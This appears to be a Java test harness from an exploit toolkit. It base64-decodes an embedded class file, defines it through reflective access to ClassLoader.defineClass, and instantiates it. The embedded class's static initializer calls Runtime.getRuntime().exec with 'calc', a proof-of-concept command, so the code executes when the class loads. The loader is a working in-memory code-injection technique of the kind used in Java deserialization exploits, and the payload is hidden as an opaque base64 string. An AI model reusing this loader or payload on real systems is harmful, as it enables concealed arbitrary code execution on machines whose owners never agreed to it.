import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception {
//        String s = convertClassFileToBase64("D:\\tools\\exp\\class\\A12345.class");
//        System.out.println(s);
//        System.out.println(s.length());
        String base = "yv66vgAAADQAGwEAIUExM2YzZTZiMjM1ZWM0NmM0YmY4OGNiYjE3OWI4YmZiNQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAmQTEzZjNlNmIyMzVlYzQ2YzRiZjg4Y2JiMTc5YjhiZmI1LmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAQamF2YS9sYW5nL1N0cmluZwcAEAEABGNhbGMIABIBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAFAAVCgALABYBAAY8aW5pdD4MABgACAoABAAZACEAAgAEAAAAAAACAAgABwAIAAEACQAAAB0ABQAAAAAAEbgADwS9ABFZAxITU7YAF1exAAAAAAABABgACAABAAkAAAARAAEAAQAAAAUqtwAasQAAAAAAAQAFAAAAAgAG";
        loadBase64ToObject(base);
    }

    public static String convertClassFileToBase64(String filePath) throws IOException {
        File classFile = new File(filePath);
        byte[] fileContent = Files.readAllBytes(classFile.toPath());
        return Base64.getEncoder().encodeToString(fileContent);
    }


    public static void loadBase64ToObject(String base) throws Exception{
        byte[] decode = Base64.getDecoder().decode(base);
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class invoke = (Class) defineClass.invoke(contextClassLoader, decode, 0, decode.length);
        invoke.newInstance();
    }
}
